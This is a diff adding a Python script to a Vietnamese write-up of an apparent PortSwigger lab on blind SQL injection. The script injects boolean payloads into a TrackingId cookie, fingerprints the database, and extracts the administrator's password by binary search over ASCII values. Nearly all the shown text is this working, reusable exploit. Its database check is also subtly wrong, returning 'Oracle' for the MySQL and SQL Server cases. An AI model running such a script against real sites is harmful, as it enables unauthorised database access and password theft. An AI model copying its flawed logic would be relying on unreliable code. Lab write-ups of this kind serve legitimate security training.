@@ -60,7 +60,262 @@
 
 * **2. Tìm cách khai thác**
 
-* Cách 1: Sử dụng `requests` kết hợp với binary search và bruteforce để tìm password
+  * Cách 1: Sử dụng `requests` kết hợp với binary search và bruteforce để tìm password
+  
+  ```python
+  import sys
+  from urllib.parse import urljoin
+  import urllib3
+  urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+  
+  # ======================= CURLCONVERTER ====================================
+  import requests
+  
+  cookies = {
+      'TrackingId': 'xcm4SelFAQIGVYKo',
+      'session': 'jWH8Q9OQBsqGYhTJAEUiDP0KXw7X8WBr',
+  }
+  
+  headers = {
+      'Host': '0a14009d03ae8692803e306300720055.web-security-academy.net',
+      'Sec-Fetch-Site': 'same-origin',
+      'Sec-Fetch-Mode': 'navigate',
+      'Sec-Fetch-Dest': 'empty',
+      'Referer': 'https://0a14009d03ae8692803e306300720055.web-security-academy.net/',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
+      # 'Accept-Encoding': 'gzip, deflate, br',
+      'Accept-Language': 'en-US,en;q=0.9',
+      'Priority': 'u=4, i',
+      # 'Cookie': 'TrackingId=xcm4SelFAQIGVYKo; session=jWH8Q9OQBsqGYhTJAEUiDP0KXw7X8WBr',
+  }
+  
+  params = {
+      'category': 'Gifts',
+  }
+  
+  # ============================ END CURLCONVERTER =====================================
+  
+  
+  
+  
+  
+  # ------------------------------------------------------------------------------------
+  # ============================ CONFIGURED VARIABLES & FUNCTIONS ======================
+  # ------------------------------------------------------------------------------------
+  
+  
+  # ================= VARIABLES =================
+  
+  host = headers.get('Host') or headers.get(':authority')
+  user_agent = headers.get('User-Agent')
+  referer = headers.get('Referer')
+  
+  sec_ch_ua = headers.get('Sec-Ch-Ua')
+  sec_ch_ua_mobile = headers.get('Sec-Ch-Ua-Mobile')
+  sec_ch_ua_platform = headers.get('Sec-Ch-Ua-Platform')
+  
+  accept = headers.get('Accept')
+  accept_language = headers.get('Accept-Language')
+  
+  sec_fetch_site = headers.get('Sec-Fetch-Site')
+  sec_fetch_mode = headers.get('Sec-Fetch-Mode')
+  sec_fetch_user = headers.get('Sec-Fetch-User')
+  sec_fetch_dest = headers.get('Sec-Fetch-Dest')
+  
+  cache_control = headers.get('Cache-Control')
+  upgrade_insecure = headers.get('Upgrade-Insecure-Requests')
+  priority = headers.get('Priority')
+  
+  # Cookies and Sessions
+  
+  cookie_list = [[k, v] for k, v in cookies.items()]
+  
+  '''
+  Format of the list:
+  
+  cookie_list = [
+      [cookie_list[0][0], cookie_list[0][1]], 
+      [cookie_list[1][0], cookie_list[1][1]],
+      ...
+  ]
+  
+  Example:
+  
+  cookie_list = [
+      ['session', 'Kjj4UlUqtepA8nZck8kskDidH6tj17WX'],
+      ['TrackingId', 'ababascabscajsdb'],
+  ]
+  
+  Modify:
+  
+  cookie_list[1][1] = 'voucher_cdecdaf'
+  
+  
+  '''
+  
+  cookies = dict(cookie_list)
+  
+  # Parameters
+  
+  param_list = [[o, u] for o, u in params.items()]
+  
+  
+  '''
+  Format of the list:
+  
+  param_list = [
+      [param_list[0][0], param_list[0][1]], 
+      [param_list[1][0], param_list[1][1]],
+      ...
+  ]
+  
+  Example:
+  
+  param_list = [
+      ['category', 'Pets'],
+      ...
+  ]
+  
+  Modify:
+  
+  param_list[1][1] = "Pets' UNION SELECT ... FROM ... WHERE ..."
+  
+  '''
+  
+  params = dict(param_list)
+  
+  
+  # ==================================== FUNCTIONS ====================================
+  
+  # The sign of successful Blind SQLi (TRUE_INDICATOR) in HTML source code.
+  DEFAULT_TRUE_INDICATOR = "Welcome back!"
+  DEFAULT_INJECT_IN = "cookies"
+  DEFAULT_INJECT_IN_KEY = "TrackingId"
+  
+  url = urljoin(referer, '/filter')
+  
+  def check_boolean_base_sqli(payload, inject_in=DEFAULT_INJECT_IN, key=DEFAULT_INJECT_IN_KEY, indicator=DEFAULT_TRUE_INDICATOR):
+      
+      # Make copies of original dictionaries
+      req_args = {
+          "headers": headers.copy(),
+          "cookies": cookies.copy(),
+          "params": params.copy()
+      }
+  
+      # Find inject_in (cookies, params, headers) to inject
+      target_dict = req_args.get(inject_in)
+      if target_dict:
+          # Add payload into inject_in
+          base_val = target_dict.get(key, "")
+          target_dict[key] = f"{base_val}{payload}".strip()
+  
+      try:
+          # Receive response (Copied from curlconverter)
+          response = requests.get(
+              url,
+              verify=False,
+              **req_args, # Extract **req_args: headers=headers, cookies=cookies...
+          )
+          # Check if the response has TRUE_INDICATOR
+          return indicator in response.text
+      except Exception as e:
+          print(f"\n[-] Connection Error: {e}")
+          return False
+  
+  def identify_dbms():
+      print("[*] Identifying the Database Management System...")
+      
+      # Try PostgreSQL (using pg_catalog)
+      pg_payload = "' AND EXISTS(SELECT * FROM pg_catalog.pg_class) -- "
+      if check_boolean_base_sqli(pg_payload, inject_in="cookies", key="TrackingId", indicator="Welcome back!"):
+          print("[+] DBMS might be PostgreSQL.")
+          return "PostgreSQL"
+      
+      # Try Oracle (query from dual)
+      oracle_payload = "' AND EXISTS(SELECT banner FROM v$version) -- "
+      if check_boolean_base_sqli(oracle_payload, inject_in="cookies", key="TrackingId", indicator="Welcome back!"):
+          print("[+] DBMS might be Oracle.")
+          return "Oracle"
+      
+      # Try MySQL
+      mysql_payload = "' AND @@version_comment IS NOT NULL -- "
+      if check_boolean_base_sqli(mysql_payload, inject_in="cookies", key="TrackingId", indicator="Welcome back!"):
+          print("[+] DBMS might be MySQL.")
+          return "Oracle"
+  
+      # Try SQL Server
+      sql_server_payload = "' AND EXISTS(SELECT * FROM sys.objects) -- "
+      if check_boolean_base_sqli(sql_server_payload, inject_in="cookies", key="TrackingId", indicator="Welcome back!"):
+          print("[+] DBMS might be SQL Server.")
+          return "Oracle"
+  
+      print("[-] Unsure about DBMS.")
+      return "[-] Unsure about DBMS."
+  
+  def get_query_length(sql_query):
+      """Tìm độ dài của chuỗi kết quả trả về từ câu lệnh SQL."""
+      print(f"[*] Đang tìm độ dài kết quả cho câu truy vấn: {sql_query}...")
+      for length in range(1, 101):  # Thử tìm độ dài trong khoảng từ 1 đến 100 ký tự
+          payload = f"' AND LENGTH(({sql_query}))={length} -- "
+          if check_boolean_base_sqli(payload):
+              print(f"[+] Độ dài tìm thấy: {length} ký tự.")
+              return length
+      print("[-] Không tìm thấy độ dài phù hợp trong khoảng giới hạn thiết lập.")
+      return None
+  
+  def extract_data(sql_query, length):
+      """Trích xuất dữ liệu ký tự bằng thuật toán Binary Search dựa trên mã ASCII."""
+      print(f"[*] Đang giải mã dữ liệu cho câu truy vấn bằng Binary Search...")
+      extracted_str = ""
+      
+      for i in range(1, length + 1):
+          low = 32  # Ký tự khoảng trắng trong bảng mã ASCII
+          high = 126 # Ký tự '~' trong bảng mã ASCII
+          
+          while low <= high:
+              mid = (low + high) // 2
+              # Sử dụng hàm SUBSTRING và ASCII để so sánh mã số của ký tự thứ i
+              payload = f"' AND ASCII(SUBSTRING(({sql_query}), {i}, 1)) > {mid} -- "
+              
+              if check_boolean_base_sqli(payload):
+                  # Đúng -> Ký tự có mã ASCII nằm trong khoảng (mid + 1, high)
+                  low = mid + 1
+              else:
+                  # Sai -> Ký tự có mã ASCII nhỏ hơn hoặc bằng mid
+                  high = mid - 1
+                  
+          # Ký tự tìm thấy sau khi kết thúc tìm kiếm nhị phân tại vị trí i
+          char_found = chr(low)
+          extracted_str += char_found
+          sys.stdout.write(f"\r[+] Đang dò: {extracted_str}")
+          sys.stdout.flush()
+          
+      print(f"\n[+] Kết quả trích xuất hoàn tất: {extracted_str}\n")
+      return extracted_str
+  
+  
+  
+  
+  if __name__ == "__main__":
+      # Find SQLi bug
+      print("[*] Finding Blind SQLi bug...")
+      if not check_boolean_base_sqli(payload="' AND 1=1 -- ", inject_in="cookies", key="TrackingId", indicator="Welcome back!"):
+          print("[-] Không nhận được dấu hiệu 'Welcome back!' khi gửi payload True. Vui lòng kiểm tra lại..")
+          sys.exit(1)
+      print('[+] Có lỗi SQLi với payload nằm tại {inject_in: key}.')
+      
+      # 1. Identify DMBS
+      dbms = identify_dbms()
+      
+      # 2. Bạn có thể thay đổi câu truy vấn SQL ở đây tùy theo mục đích khai thác
+      # Ví dụ mặc định: Khai thác mật khẩu của tài khoản administrator (Yêu cầu chính của Lab này)
+      target_query = "SELECT password FROM users WHERE username='administrator'"
+      
+      length = get_query_length(target_query)
+      if length:
+          extract_data(target_query, length)
+  ```
 
 > [!NOTE]
 > Tất nhiên, do bài cho sẵn nên mới biết là dump thẳng từ đâu, tên là gì. Chứ nếu đề bài có database lớn, không có gợi ý thì đoán đến Tết chưa chắc xong.
